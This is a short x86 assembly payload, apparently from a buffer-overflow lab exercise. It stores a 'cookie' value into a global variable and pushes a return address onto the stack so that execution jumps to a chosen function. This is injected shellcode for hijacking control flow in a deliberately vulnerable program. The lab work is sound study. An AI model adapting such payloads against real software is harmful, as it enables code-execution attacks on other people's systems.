movl $0x238d4669, 0x804c0e4 # move cookie value inside global_value
movl $0x08048d4c, 0x55682f08 # enter the return address into the stack
ret # ret to the return address entered above
